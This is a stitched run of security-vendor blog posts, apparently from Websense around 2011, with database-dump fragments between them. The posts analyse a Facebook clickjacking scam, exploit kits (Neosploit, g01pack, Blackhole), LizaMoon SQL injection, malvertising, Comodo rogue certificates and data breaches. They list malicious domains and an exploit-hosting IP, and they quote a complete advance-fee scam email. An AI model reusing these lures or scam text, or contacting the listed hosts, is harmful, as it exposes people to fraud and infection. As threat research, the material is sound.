As a Websense customer, if you are running our Web Security Software or real-time analytics, your users would have been protected from the first link right off the bat, thanks to our Advanced Classification Engine (ACE): \n\n\n	To show how this particular attack works, I set up a scenario using a test account. In this scenario, a friend named Chris has already fallen for the scam and posted a comment to his own Facebook profile page, which appears on all of his friends\' walls. \n\n\n	Here\'s what Chris, a victim of this scam, commented on:\n\n\n	 \n\n\n	The Enticement \n\n\n	\n\n\n	 \n\n\n	Remember scammers aren\'t going to post something boring, this is meant to be enticing ... OK, I\'ll play along. Let\'s see what happens as I follow the trail. By clicking on the link, I\'m redirected to mcdshock DOT info (robtex):\n\n\n	\n\n\n	 \n\n\n	A Real CAPTCHA? \n\n\n	Interesting. So this site says that I can only continue if I solve a CAPTCHA. The site explains that it\'s using the CAPTCHA because it is attempting to protect itself from  BOTS. That seems to make sense. CAPTCHAs are in fact meant to tell humans and programs apart (in theory) - but this particular page has more going on than meets the eye. \n\n\n	 \n\n\n	Let\'s look at the source code behind this page (full source code can be found here):\n\n\n	\n\n\n	 \n\n\n	The first thing that is noticeably odd is that the source code indicates the use of the Facebook comments social plugin (see fb:comments code) that allows websites to include a comment box linking to a user\'s Facebook page if they are logged into Facebook in another window or tab. A typical comment box looks like this:\n\n\n	\n\n\n	 \n\n\n	But looking at the source code, no such comment box was displayed. Let\'s take an even closer look at the source code to figure out why ...\n\n\n	 \n\n\n	Classic Click-jacking\n\n\n	The style sheet section of the source code shows that the Facebook comment box is being wrapped in a div that has been given a style making it completely invisible (see opacity): \n\n\n	\n\n\n	 \n\n\n	Next the source code is overlaying a background image on the entire section where the Facebook comment box is:\n\n\n	\n\n\n	 \n\n\n	Can you guess what that image looks like? Here it is ...\n\n\n	\n\n\n	 \n\n\n	Analysis of the source code indicates that the CAPTCHA is not a real CAPTCHA but an image sitting on top of a Facebook comment box meant to trick me, the unprotected user, into clicking on something - all the while, hiding its true nature. The submit button is carefully placed on top of the comment button. By clicking on it, I would be submitting text to my Facebook wall with text that is supplied by the scammer\'s website.\n\n\n	 \n\n\n	... and sure enough, once I hit submit, here is the comment that is posted to my Facebook page:\n\n\n	\n\n\n	 \n\n\n	Classic case of click-jacking! \n\n\n	That\'s not the end of it though! What happens next after clicking submit, apart from a comment being posted to my profile page is that I\'m redirected, first to a tracking website:\n\n\n	\n\n\n	 \n\n\n	... and next to isozbanks DOT com, where I\'m asked for further verification to either play a Pacman game or answer what my favorite Facebook game is:\n\n\n	\n\n\n	 \n\n\n	Another click? Can you say clicking-jacking part deux? Indeed, if I click on one of the above links, another comment is posted to my Facebook profile page:\n\n\n	\n\n\n	 \n\n\n	Click-jack complete, commence project information gathering \n\n\n	Next, I\'ll be redirected to playsushi DOT com (Alexa Ranking: 7903)  where if I click on \"Click Here To Play,\" I\'ll be prompted to download an executable called SetupPlaySushi.exe (VirusTotal report):\n\n\n	\n\n\n	 \n\n\n	Had I chosen instead to take the survey of my favorite Facebook game, I would\'ve been brought to the following pages where the attacker would have a very good opportunity to capture my email address and post another comment to my Facebook page. Upon clicking continue, I\'d be asked to give out more information (a great method for attackers to build up a profile for tracking purposes and to store their victims\' personal information).\n\n\n	\n\n\n	 \n\n\n	Now assuming I either visited the Pacman site or the survey site, the following page is shown:\n\n\n	\n\n\n	 \n\n\n	I then must proceed through a few more Web pages, which in the end ask me to play more games or fill out more surveys for verification purposes (it\'s worth noting that each user will be prompted with different games and different links) - again really just to trick me into clicking and sending comment spam to my own Facebook profile page:\n\n\n	\n\n\n	 \n\n\n	Clicking one of these links will bring me to the following pages:\n\n\n	\n\n\n	 \n\n\n	Finally after viewing any of the above sites, I\'ll get a final Web page screen indicating that  the content has been unlocked and that I can view the video.\n\n\n	\n\n\n	 \n\n\n	Is there even a real video to view? \n\n\n	At the end of this entire process, I\'ll be rewarded for my persistence by being able to finally see the video I was promised.\n\n\n	 \n\n\n	Let\'s review all that I had to give up to get to view the final video: \n\n\n		Full name\n	\n		Full address\n	\n		Gender\n	\n		Phone number\n	\n		Downloading and possibly execution of an executable (spyware)\n\n	 \n\n\n	The Click-jacking to post comments to my profile was the main motivation from the attacker\'s point of view. Everything that came after was just a bonus.\n\n\n	\n\n\n	 \n\n\n	To give you an estimate of how many people fell for this scam, we can look at the hits on YouTube yesterday and this morning, Overnight more than 100,000 users visited the YouTube video, showing how successful this scam really was.\n\n\n	\n\n\n	 \n\n\n	Don\'t become a victim!

This brings me back to a few more third-party SLA elements that I overlooked in my previous post after the Epsilon breach. I read a recent Mashable article that points to the repercussions of this episode, and what it means for many cloud or SaaS startups – things you should consider before even thinking about engaging with them: 1. <!--[endif]--> The importance of having a multi-tenant architecture that is fully redundant is underscored. The article cites that “most startups don’t have the time or resources to engineer for multiple cloud systems.” If I’m spending my company money on a SaaS provider I’m going to be asking about their redundancy and get reassurances that those will not fail when I need them most. <!--[if !supportLists]--> 2. <!--[endif]--> Is their architecture ISO 27001 certified? This important international standard evolved from BS 7799. ISO 27001 requires that organizations: Systematically examine the organization\'s information security risks, taking account of the threats, vulnerabilities and impacts; Design and implement a coherent and comprehensive suite of information security controls and/or other forms of risk treatment (such as risk avoidance or risk transfer) to address those risks that are deemed unacceptable; and Adopt an overarching management process to ensure that the information security controls continue to meet the organization\'s information security needs on an ongoing basis Now, I know security is different from resiliency, but by going through the intense ISO certification process companies are illustrating an investment in the platform that is critical to ongoing performance. Also, don’t forget to ask about historical uptime from any providers (especially startups) and a check with their reference customers is absolutely mandatory . You absolutely need this combination of security and resiliency guaranteed if you don’t want to be called into the bosses office the next time one of your providers goes down, because, this incident proves it CAN and WILL happen.

We first found on Monday that all the image search results took users to a notorious exploit kit – Neosploit. Later, it changed to redirecting users to rogue AV sites. As we publish this blog, the search results are still poisoned and are leading to Neosploit again. Websense customers are protected from both types of attack by ACE, our Advanced Classification Engine.\n\n\n	The search results for \"Presley Walker\" through Google Image:\n\n\n	 \n\n\n	 \n\n\n	Let\'s take a look at the first attack case. When a user clicks the pictures on the top line, the user will be redirected to a Neosploit exploit page.\n\n\n	 \n\n\n	Below is one of the redirection chains used by this exploit kit: \n\n\n	\n\n\n	 \n\n\n	From the chain, we see the third URL is the malicious site holding the exploit code. We found that all the exploited sites are hosted on the same IP 66.235.180.91, and interestingly, they constructed it with the same path namedTF19, which looks like a pattern of this campaign. At last it will trigger appropriate vulnerabilities targeted by this exploit kit according to the user\'s operating system and browser. From the chain above we see it downloaded a PDF file that targeted three Adobe Reader vulnerabilities. This PDF file is heavily obfuscated and has a relatively low VirusTotaldetection.\n\n\n	 \n\n\n	The list of URLs hosted on the IP, as shown from our Threatseeker network: \n\n\n	\n\n\n	 \n\n\n	Neosploit is a well-known exploit kit in the black market. The authors reportedly stopped supporting and updating the exploit kit due to financial problems, but variants of Neosploit have been updated frequently. The variants may contain MDAC (CVE-2006-0003), ActiveX (CVE-2008-2463, CVE-2008-1898), and three Adobe Reader (Collab.getIcon,Util.Printf, Collab.collectEmailInfo) vulnerabilities, among others. \n\n\n	The second case is one of the common tricks black hat SEO campaigns always use: luring users to download fake antivirus software called InstallInternetProtectionXXX.exe. From the VirusTotal scan result, only 20% of antivirus engines detected this malware. \n\n\n	 The rogue AV page when using Firefox to surf the Web:', 'https://www.forcepoint.com/blog/security-labs/google-image-poisoning-leads-exploit\n');

Our customers are protected from this campaign by ACE, our Advanced Classification Engine.\n\n \nIt works by creating an album - “My Top 10 stalkers” - with the description \"Check who views your profile @,\" followed by a bit.ly URL-shortened link. It then automatically uploads a photo to the app and tries to mark all the user\'s friends in the photo.\n\n \nThe bit.ly link redirects the user to a page that uses JavaScript to determine the geographical location of the computer based on its IP address. Depending on the location, the page then redirects users located in specific targeted countries to the Facebook App in an attempt to further spread the infected link. The campaign is targeted at Facebook users in the United States, Canada, United Kingdom (including a specific target for Great Britain), Saudi Arabia, Norway, Germany, Spain, Slovenia, Ireland, and United Arab Emirates. \n\n \nAt the time of writing, hackers have switched to using a new app. The first illegitimate app was deleted by the Facebook security team. Both apps use exactly the same mechanism to post spam profile messages in Facebook. Regardless of whether the JavaScript redirects the browser to the Facebook app because of its origin, all users are ultimately redirected to a scam page that tries to lure them into completing several fake surveys. Hackers use this method to try to collect personal information such as the user\'s home address, e-mail address, or phone number.\n\n \nIf the user tries to navigate away from the page or close the browser, a message appears asking them to stay and complete a \"SPAM-free market research survey to gain access to this special content.\" Special it may sound, but it is definitely not spam-free!\n \nAs always, if a page forces you to Like, Share, or install an application in order to view it, DON\'T DO IT!

Websense customers are protected from this attack by ACE, our Advanced Classification Engine. \nThe first phase of the attack is a typical vector for exploit kits to drive traffic to their sites: script injections.  Script HTML code is put on legitimate Web sites meant to drive traffic to the attack kits without the victim\'s knowledge.  In this case, legitimate sites are injected with malicious JavaScript. \nScreen shot of malicious script injection (Phase 1):\n\n \nIn the second phase, this script injection then pulls obfuscated content from another site.  The obfuscated content creates an iframe that is used to pull content from the exploit kit site.  \nScreen shot of the obfuscated redirect site used in the above injection (Phase 2):\n\n \nScreen shot of the deobfuscated redirection site:\n\n \nThe exploit kit can basically be described as a drive-by download site used in the third and final phase of this attack.  Its intent is to scan, attack, and run malicious code on the visitor\'s computer.  If one of the exploit kit\'s Web attacks is successful, it could put malware on a victim\'s computer that is meant to remotely control the computer.  The binary that this kit tries to run on target computers has low detection as a Rogue AV installation.  As is typical, the exploit kit\'s Web attack code is obfuscated.\n \nScreen shot of obfuscated exploit kit code (Phase 3):\n\n \nIt\'s in cases like this that we can really harness the power of our ThreatSeeker® Network, not only to better protect our customers but also to perform further research into attacks!  With all of the scanning that ThreatSeeker® does, we get a large amount of data which we can correlate.  In this example, I can see all of the URLs associated with the IP address that this exploit kit was hosted on. \n \nScreen shot of URL report from hosting IP:\n\n \nIn the screen shot above, I\'ve highlighted that there are a number of URLs with an \"/admin/\" directory.  Assuming that these are the same attack kits hosted on this IP, I can try to see if our attack host has the same page.  Sure enough, the attack site discussed in this blog follows the convention of other sites hosted on this IP.\n \nScreen shot of the attack kit admin page:\n\n \nNotice the title on the admin page: it has an email address for a group known as the Iranian Cyber Army.  This is a known attribute of a kit called g01pack malware tool.  We were able to access the admin panel and confirm that this site is hosting an installation of g01pack malware tool. \n \nScreen shot for g01pack admin statistics for this attack:\n\n \nUpdate:\n  We are aware that the g01pack admin panel is in fact a faked honeypot tool used by attackers.  This admin \"tool\" is used to track researchers who try to access admin panels for attack kits, an interesting tactic.  However, the threat described in this blog is a very real threat and we are seeing other attack hosts on the same IP attacking visitors.  Seeing that there are other hosts on this IP which also host the fake admin panel, these hosts are seen as exploit kit attack code which could be used in the same script injection attacks as well as other injection attacks.  Thanks @briankrebs for getting in touch with us to clarify this post.', 'https://www.forcepoint.com/blog/security-labs/mass-injections-leading-g01pack-exploit-kit\n');

Now, I’m going to go back to something I covered in the first post – spearphishing. Several recent articles revealed that the Epsilon breach and the recent breach at RSA were a result of spearphishing. These incidents are prime examples of the errors of today’s perimeter-focused approach to security. First off, if you read accounts of the Epsilon attack , they are filed in the old phishing bucket – the attackers apparently used a combination of keyloggers and a known virus, Win32.BlkIC.IMG to get inside the system. However, RSA’s explanation, in their “Anatomy of an Attack” blog post notes it was the victim of an ADVANCED PERSISTENT THREAT. Yes, the dreaded “ APT .” However, if you read further analysis of the attack , it reads very similar to the Epsilon attack: an email was sent to two small groups in the company, and someone opened one. The only seeming variable is that the RSA attempt used a zero-day in Adobe Flash player to compromise someone. Zero Days are a routine part of today’s security world. Check out seemingly every Patch Tuesday , or all the automatic security software updates you get if you need to confirm that statement. Phishing and Zero Days are an everyday thing. The problem is, very few are looking at the ways that most of today’s security solutions deal with these everyday occurrences. What these attacks prove is that traditional perimeter based security technologies are necessary, but insufficient to deal with everyday types of attacks like these. They simply fail too often to be relied on. I’m not saying APTs do not exist. They do and they are nasty, but the old style threats combined with old and new delivery platforms like social web plus APTs significantly expand the attack surface, which is inefficient and frankly ineffective to secure with the old model. As my colleague, Jason Clark, our CSO, pointed out in his Tomb Raider analogy – a lot of times the bad guys will get in – but you can stop them from getting out. Here’s the deal. You need systems in place that both prevent the bad guy getting in AND the content awareness to recognize when they are in and stop them from getting out with the goods. Let’s face it. Bad guys create millions of new signatures a year. Therefore, you need the most up to date, real-time intelligence to prevent the bad-guys from coming in. Not the antiquated signature models of yesteryears perimeter security. For example, cloud-based intelligence can decipher and categorize content on the fly. But this real-time analysis is just one part. What happens if the bad guys do get in? To stop them from getting out, first, you need to be aware of your valuables, your treasure, and keep an eye on it. Then, you need to know if that data is being moved. And you better be able to tell that if it is being moved, whether or not it is going to the right sources. Those are the primary principles behind content security , and a significant differentiator for what we at Websense have resolved for more than three years, leading to the introduction of our TRITON security architecture . The simple fact is incidents like the RSA and Epsilon attacks will continue as long as security departments rely on the defensive tactics of the 2000s. The big question is: is your company next, and, if so, are you ready to defend against these everyday threats? How are these threats changing the ways you are looking to protect your organization?

I am contacting you solely on a business related issues.\nI became an orphan some couple of years ago. I am contacting you about a need I have and I believe you are well able to help me after my severe and fervent prayer for God to link me up with some one who will be capable of helping me out from Ghana as my foreign beneficiary. It all depends on our trusting each other but I\'ve chosen to contact you prayerfully and believing that you are the person that can help me.\nThe source of my parent\'s death was believed to be from our detractors who are never happy that he was making so much progress. The issue is that my parents are diamond merchants in my country Liberia and they made too much money from the business, that prompted the government of Liberia to probe them.\nFor this reasons, during the crisis in Liberia, our home was among the first target by the Liberian rebels. They allegedly said that, my late parents have a close relationship with former president of Liberia President Charles Taylor) that was their reason of storming our home. My mother died immediately they storm our resident and my father sustained serious bruises that he could not survive while in the hospital. I and my younger sister Vivian managed to escape during the incident. As i am talking to you now, i and my younger sister are staying in Ghana for some obvious reasons that i will like to relay to you on your response to this message.\nThis is a confidential matter i will like to discuss with someone whom my spirits accepted to deal with. Because after my parents exit, the government of Liberia have taken over all of our belongings. They have also emptied my parents bank accounts left alone with a deposit which my late father made in a nearby country called Ghana during his trade to Ghana. No one knows of this deposit, it is only me as the next of kin. And my father had earlier warned me not to disclose this issue to anyone before he died in the hospital after the incident that cause his death. Today I and my younger sister fend for ourselves here in Ghana.\nAnd life has been very difficult since the government of Ghana started their deportation exercise which says that we refugees should evacuate their Bujumbura refugee camp to our various countries. Please my dear beloved, our plans now are to relocate from Ghana since we can not afford to go back to Liberia following our past experience as they killed our parents, but we will need to move out the fund left by my late father here in Ghana.\n  please according to my late father\'s lawyer all we need now before these boxes can leave Ghana to  is your full contact information so as to enable the lawyer work out the papers that will back up the shipment to your location. Please i believe my lawyer will explain more better to you as soon as you come in contact with him.\nOnce you agree to help us move this fund, we will link you up with our late father\'s lawyer who will help us in securing all the necessary documents for the shipment. As soon as we agree, we will come to your country where I and my sister will invest the money under your guide. So please let us know what will be your compensation or percentage for helping me and my sister out.\nIn the attached files, you will see a photograph picture which my late father took me before he made the deposit as a proof, and a picture of my sister, Vivian. Please the lawyer have not seen this picture as my father warned me not to disclose the content of the boxes to anyone except to some one whom i have chosen to be my foreign beneficiary, and also attached are the copies of the documents that is covering the fund in the keeping company, so i want you to go through them carefully. sometime ago there was a problem in the camp and my sister lost her Liberia passport but the lawyer agreed to get her a Ghana passport if we are ready to travel out of Ghana to meet with our foreign beneficiary.\nPlease NOTE that the earlier you help us the better as you will be doing Almighty God a great favor because our lives are no more safe with these people over here. I will need your reply stating your readiness to help in seeing this through.\nWe will be needing your details as follows:\n  (1) Your Full Names.\n  (2) Your Home or Office Address.\n  (3) Your cell phone Number.\n  (4) Occupation.\n  (5) Age.\nPlease feel free if you have any question to ask.\nThanks and be bless\n  Kelvin and sister.\n-------------------------------------------------------------------------\nAnd yup, you guessed it: more convincing attachments:\n \n\n \n\n \n\n \n\n \nAnd finally, the cream of the crop: a convincing photo of Vivian, Gideon\'s or (as he prefers in the second email message) Kelvin\'s sister.\n\n \n\nWell, Kelvin Gideon Kerkula if that is your real name... consider this.

The big question is: Are you ready for them?\n\nAmong many updates, version 2.0 of the PCI Data Security Standard emphasizes the need for organizations to identify the location of sensitive payment information. Even before you conduct an audit, you should have a good understanding of where all the sensitive information resides in your network. Is it maintained in a database, file server, or perhaps even on laptops? As with many things, the challenge in meeting this requirement lies in execution.Embarking on a manual task of looking at the places you think your data resides would be difficult for many organizations. Aside from the amount of time such a project would take, the sheer resources needed would likely be a show-stopper. Luckily, there is a proven solution that’s perfectly suited for this task.\n\nData loss prevention (DLP) solutions offer an effective means of scanning an organization’s network for sensitive data. The discovery capability, available on modern DLP solutions, can scan various servers, databases, laptops, and other repositories to find sensitive information residing at those locations. In addition to finding the sensitive data, DLP solutions can also remove or encrypt the data to ensure it is secure. Industry analysts like Securosis point to DLP solutions as a natural fit to address some of the latest PCI Data Security Standard v2.0 requirements.\n\nThe discovery capability is readily available in most DLP products. If you are looking into DLP to help you meet this new requirement, you should also make sure that any solution you look at should be able to: \n\nProvide a simple policy framework to accurately detect sensitive data throughout the organization.\n	Conduct automated scheduling of discovery tasks to ensure organizations are always on top of where their sensitive data is - even when you aren\'t scheduled for an audit immediately.\n	Incorporate the discovery capability as part of your organizational comprehensive data security strategy - you should be able to use the same discovery elements to make sure other sensitive information (like SS numbers, PII, or customer records and patient data) is only where it is supposed to be - and stays there.\nIf you need additional resources on PCI, contact a reseller to better understand how DLP can help you with the new requirements of PCI, or visit the PCI Security Standards website at https://www.pcisecuritystandards.org/.', 'https://www.forcepoint.com/blog/insights/are-you-ready-pci-data-security-standard-v20\n');

You know what I’m talking about. Let’s talk data breaches. Let’s avoid the hype of the headlines and some of the sensationalism of the media coverage. And look at a few facts from recent episodes to see if we can identify the root issue at the heart of the breaches. I’ve already posted a first glance look at the Epsilon breach , but, let’s talk about this in a little more detail. There are three critical elements that need to be addressed here. <!--[if !supportLists]--> 1. <!--[endif]-->The business imperatives that lead to this episode <!--[if !supportLists]--> 2. <!--[endif]-->Why most organizations aren’t currently equipped to prevent such breaches <!--[if !supportLists]--> 3. <!--[endif]-->What companies need to do to protect themselves from third part breaches First, let’s address some of today’s root causes for a data breach. How we do business and, ultimately, create, communicate and consumer content is transforming. The mobility of the workforce, the outsourcing of services and data and the widespread adoption of the cloud are just a few of the issues that have led to the recent spate of data leaks. Today, entire applications, networks, and even security is delivered in the cloud. And our data is there too, free for our employees, customers, partners, and others to access. Third-party solutions, both sanctioned and unsanctioned by IT, are also transforming the enterprise. Blended threats, script-based attacks, APTs ( ugh ) capitalize on the openness of today’s enterprise. Traditional security, however, is meant to solve one problem really well. When the problems and technologies converge (blended threat), the effectiveness of those technologies plummet. That impotence is further exacerbated by the perimeter, or moat-based approach to security, which is challenged by today’s distributed, mobile, social, and cloud-based enterprise. Ever heard of the expression, “never bring a gun to a knife fight?” There are several things that need to be addressed, if you are handing data to a third party. Any service level agreement needs to ensure that the data shared is protected by the strongest measures appropriate to the level of sensitivity of that data. With that, specific criteria for what that protection includes should also be defined as part of the agreement. In the case of some service providers and cloud platforms, like Salesforce.com, for example, you can fingerprint and apply rules to the data that only allow it to be accessed by certain individuals for specific purposes. However, to do that effectively, you need to have the controls in place within your own organization first, to ensure that only the RIGHT data is exported. And you need to have periodic audits and oversight to ensure your security is in effect, and adapting to the changing threat landscape. In my next post, I’ll be examining why it is a little ridiculous to call one recent breach the result of an APT – and why you should think so, too. In the meantime, does anyone else have some best practices to add to protect third party data transfers?...(read more)', 'https://www.forcepoint.com/blog/insights/ripped-headlines-%E2%80%9C-leaks-thousands-your-files%E2%80%9D-data-breaches-part-1\n');

Or more accurately, in my home email. I received *three* almost identical messages from three different companies that told me in almost identical language that my name and email address had been leaked and, “you may receive spam email messages as a result. We want to urge you to be cautious when opening links or attachments from unknown third parties.” Epsilon, an online marketing firm with a huge portfolio of diverse clients, lost a huge amount of customer data. In volume, it might be the largest breach in history. At little risk of overstatement, let us rephrase the warning: “Don’t feel safe just because they only got your name and email and not your social security number. Make no mistake about it, you are about to become the target of a spear phishing attack.” For the uninitiated, spear phishing attacks take advantage of trusted relationships. You expect emails from these trusted companies, so you are less suspicious, less vigilant, and more likely to fall for a scam. Think you are too savvy? This is exactly how RSA just lost their valuable data—by an executive clicking on an email with a link to a web site that looked like it was from a known vendor. In the short run, Computerworld has good recommendations: “Be on the lookout for spear phishing campaigns and don\'t nibble on them. Keep your security software updated. If you feel like you really must open an email from one of these companies, then mouse over the link to see if the domain name matches the company. Check for HTTPS. Don\'t give out sensitive personal information unless you are 100% sure you are dealing directly with the company as these emails can open the way to identity theft.

The content isn\'t even obfuscated which is somewhat unusual. All the code does is a redirect to a rogue AV site. We\'ve seen the scripts change over time to redirect to several different rogue AV sites:\n\n\nWhat happens to the user?\nWe wrote in an earlier post that the payload site doesn\'t work properly, but further testing shows that it does and we created a video showing what happens if a user visits a website that contains the injected code. The video is available at the end of this post. The user only gets the malicious code once per IP address, so if you\'ve already visited the site you won\'t get the code again. This is something we see often in attacks, especially in exploit kits. \nThe Rogue AV software that is installed is called Windows Stability Center and the file that is downloaded is currently detected by 13/43 anti-virus engines according to VirusTotal. \n\n \nThe software then displays a warning that there are lots of problems on your PC. To fix them you have to pay for the full version of the application. Very traditional rogue AV scam. Dancho Danchev has some more information on his blog.\n\n \nWhere are users coming from?\nWe looked at reports of traffic to lizamoon.com as indicated by data collected by the Websense Threatseeker Network and here\'s a graph of where those users are located.\n\n\nSo what about iTunes?\nWe received blog comments from our readers (keep them coming, we read them all!) and some were critical of our use of iTunes in the title of the previous post and how we stated that iTunes URLs had been compromised, but the script neutered by Apple. All of what we stated was technically correct, but perhaps we didn\'t make it clear enough. \nEvery time there\'s a mass-injection like this, and there really hasn\'t been anything this big before, we try to identify larger systems and sites that have been affected to give some indication of how wide the attack has spread. And there are few systems out there bigger than iTunes, so when we saw that content on itunes.apple.com contained the injected link we wanted to make people aware of that, even if the script didn\'t work. It seems that some readers weren\'t too happy about that and argued that we could also say that Google Search was compromised because it also shows the injected code in search results. We don\'t really agree with that, but perhaps we shouldn\'t have highlighted it the way we did.\n \nQuestions & Answers about the LizaMoon mass-injection \nQ: Why is this called LizaMoon?\nA: One of the first domains we saw involved in this campaign was created on March 25, 2011 was called lizamoon.com.\n \nQ: How many pages have been affected by this?\n  A: With the complications of search algorithms and how they count results it\'s hard to say. Google Search returns more than 1.5 million results. A Bing Search returns about 900,000 results but the same reservation about their algorithm and how they count results applies. We believe the number of sites infected are significantly smaller.\n \nQ: How does the script get added to the compromised sites?\n  A: We\'re still looking into that. We know that it uses SQL Injection to do it and not XSS as some of our blog readers have suggested.\n \nQ: How do you know it\'s using SQL Injection?\n  A: We have been contacted by people who have seen the code in their Microsoft SQL databases. Initially we only received reports of users running Microsoft SQL Server 2000 and 2005 being hit but since then we have also received reports of websites using Microsoft SQL Server 2008 being injected as well.\n \nQ: Could this mean that there\'s a vulnerability in Microsoft SQL Server 2000 and 2005?A: No. Everything points to that this is a vulnerability in a web application. We don\'t know which one(s) yet but SQL Injection attacks work by issuing SQL commands in unsanitized input to the server. That doesn\'t mean it\'s a vulnerability in the SQL Server itself, it means that the web application isn\'t filtering input from the user correctly.\n \nQ: What happens when I visit a site that contains the injected script?\n  A: Your PC will get redirected to a rogue AV site, displaying fake information about your PC being infected.\n \nQ: Will I get redirected over and over again if I visit a compromised site?\n  A: No, the script only redirects you once.\n \nQ: When will the LizaMoon attack be over?\n  A: Not anytime soon. We\'re still seeing references to Gumblar, which was a mass-injection attack found in 2009.\n \nVideo\nBelow is a video showing what happens when a user visits a site that has the LizaMoon script injected.', 'https://www.forcepoint.com/blog/security-labs/update-lizamoon-mass-injection-and-qa\n');

How is it different from traditional security? And why should I care? So let’s take a moment to explore these questions, starting with the last question first: you should care because the traditional pillars of enterprise security—perimeter and endpoint security – are clearly no longer cutting the mustard.  In fact, talking about them takes me back to my college days preparing for the LSAT when we toyed with logical fallacies and the principle that something can be necessary, but not sufficient.   Again, just to be clear – I’m stating that both perimeter and endpoint security ARE necessary… they’re just NOT sufficient....(read more)', 'https://www.forcepoint.com/blog/insights/what-%E2%80%9Ccontent-security%E2%80%9D-and-who-put-websense-%E2%80%9Ccenter%E2%80%9D-it\n');

The first report we have of a malicious ad being displayed is from around 11:30 GMT on March 24. \nMalvertising is nothing new, we\'ve seen it effect large websites in the past but this case is slightly different. In the past the malicious ads have been displayed as part of a website and viewed with the browser. In this case the malicious ad is actually displayed inside of the Spotify application, like in the picture below (note that the ad below is not malicious, it\'s just an example): \n\n \nThe application will render the ad code and run it as if it were run inside a browser. This means that the Blackhole Exploit Kit works perfectly fine and it\'s enough that the ad is just displayed to you in Spotify to get infected, you don\'t even have to click on the ad itself. So if you had Spotify open but running in the background, listening to your favorite tunes, you could still get infected. Seems like free does come at a price after all. Spotify removed all 3rd party ads in the free version while they did their investigation but the ads have now been turned back on again. \nOnce the ad was displayed, the computer would connect to hxxp://uev1.co.cc where the exploit kit tries several vulnerabilities to infect the user.

One of the vulnerabilities the exploit kit uses is a vulnerability in Adobe Reader/Acrobat. The kit uses a heavily obfuscated PDF file to make the infected computer download the fake AV software. Here are the VirusTotal reports for the PDF and the fake AV file. Once the fake AV is launched it connects to the following domains to download additional content, including a rootkit which is a packed version of TDSS: \ntuartma.in\n  rappour.in\n  findstiff.org\n  searchcruel.org\n  findclear.org\n  replity.in\n  searchgrubby.org\n  demivee.in\n  ripplig.in\n \nHere\'s a screenshot of what the application looks like on the user\'s PC: \n\n \nOne interesting thing is that we have only seen reports from infected users in the UK.

By doing that, whoever was behind this could steal user names and passwords even though the traffic was encrypted with SSL and the user wouldn\'t know anything was wrong. With the updated CRL list the user would get a warning when visiting a site using any of the rogue certificates and would hopefully not enter any credentials. \nComodo states in their report that a user account at one of their affiliate partners was compromised and used to issue the rogue certificates. The attacker used several IP addresses when doing this, but mainly used an IP address from Iran. According to the investigation done by Comodo the attacker was very quick to issue the certificates, knew exactly which domains to issue them for, and didn\'t waste any time when doing this.\n \nHow do Websense products protect users?\nUsers who have Windows Update enabled will receive the revoked CRL automatically for Internet Explorer, and if you have automatic updates enabled for any other browser it will download the the CRL as well. Our products also have the ability to check the validity of a SSL certificate and the benefit of doing that is that the product will do it for all users, regardless of which browser they use and if they have the update or not.

If you choose this option, users will have the ability to continue browsing to dangerous Web sites with potential rogue SSL certificates, so if you don\'t wish to give users this choice, skip this step.This will prompt the user with a warning message informing them that the certificate is invalid, but they will have the option to click Continue to visit the page.\n  Select the Revocation Settings tab and make sure that the automatic download of new CRL lists is enabled:\n \nIf the automatic download was disabled, we recommend that you force an update to make sure the latest CRL lists are downloaded. If the download was already enabled, you don\'t have to do this as the updated CRL list from Comodo was released on March 15 and your Websense product will already have the list installed. Regardless if you have the CRL verification turned on or not, the Advanced Classification Engine will scan the content from any site, including those using the rogue SSL certificates, as long as you have SSL inspection turned on, and block all malicious code.', 'https://www.forcepoint.com/blog/security-labs/rogue-ssl-certificates-issued-comodo\n');

Web sites for BBC - 6 Music and BBC Radio - 1xtra were compromised and were serving a malicious iFrame to the Phoenix exploit kit. In addition, AutoTrader, eBay, the London Stock Exchange, Myvue, and many other high-profile locations were hosting ads from an ad provider called Unanimis. This Malvertising campaign occurred over a weekend, and thus did not affect as many people as it might have during work days. The advertisement had an iFrame to another exploit kit that used attachs similar to the Black Hole exploit kit. \nNight Dragon attacks were also active.  Night Dragon targets U.S. oil, gas, and petrochemical companies. It steals proprietary and confidential information from executives, by using a combination of social engineering, Remote Administration Tools (RATs), and SQL injection attacks to gain access to external and internal hosts inside companies. It is believed that the attackers are based in China, which may be why the class of attacks is called Night Dragon. \nA leaderless and anarchical Internet group, Anonymous, declared war against HBGary Federal when their head of security services said he had uncovered and planned to release the identities of Anonymous’ leaders using social networking sites. Anonymous broke into HBGary Federal’s systems and released their internal confidential information. Whoops. \nSeveral thousands of small businesses and personal sites felt victim to an error of the U.S. Department of Homeland Security and Department of Justice. These Departments announced the seizure of several domains that were involved in the distribution of child pornography. In addition to closing those domains, they managed to shut down a popular shared domain that belongs to a free DNS provider - which resulted in disconnecting of other 84,000 web sites - subdomains of mooo.com. After the incident, several thousand site owners were able to witness a banner with a message stating that advertisement and distribution of child pornography is illegal.  \nResearchers discovered a way of accessing passwords stored on iPhone and iPad. The method involves physical access to the device and takes no more than 6 minutes - enough time to carry out this procedure on stolen or unattended devices. \nGambling addiction did not benefit the Hacker who has admitted stealing $12m worth of gaming chips. The hacker has transfered 400 billion gaming chips into his fake Facebook account after gaining unauthorized access into servers of a game developer Zynga, by posing as one of the site administrators.  Ashley Mitchell was trying to sell his illegal gain for about £180,000.\nA major incident happened with Australian cosmetics retailer Lush - hackers managed to access and steal the company\'s entire customers database along with customers\' credit card details. The company had not been aware of the vulnerablility, caused by not keeping the Web site updated, and could not identify for how long this security breach had been happening.  \nTwo major online dating sites, PlentyOfFish.com and eHarmony, got hacked, and the personal and password information of their users were believed to be exposed. Ethical and legal questions were raised regarding the companys\' compensation toward such third-party security alerts.\nA high-profile victim of malware attacks this month was Nasdaq. According to Nasdaq, there was no evidence that customer information had been exposed by breach. Investigations continue to assess whether the earlier anomalies in the stock market last summer were caused by stock exchange subversion activities.\n \nWeb 2 dot uh oh\nA couple of Facebook security holes were discovered in February. First was an authentication flaw that allows a malicious Web site to disguise itself as other legitimate sites. This happens only when a malicious Web site is visited while the user is logged into Facebook. Second is yet another saga of clickjacking attacks, this time targetting Italian, Japanese, and Cyrillic audiences. Promises of interesting and perhaps controversial videos led Facebook users into clicking the \"Like\" button.\nIt\'s always interesting to see who viewed your Facebook profile. This statement is proven true as this scam is used over and over again to seduce users into adding shady applications that promise to do this, but instead lead to survey scams. You don\'t even have to be a developer to carry out these survey scams, because these are usually built using a pre-defined toolkit for only $25 or even less.\nSomething you know and something you have are the secret ingredients to Google\'s 2-factor authentication process, which hopes that any attempt to break into Google accounts would be next to impossible. This should serve well those users with weak passwords, because a required one-time password will be sent via 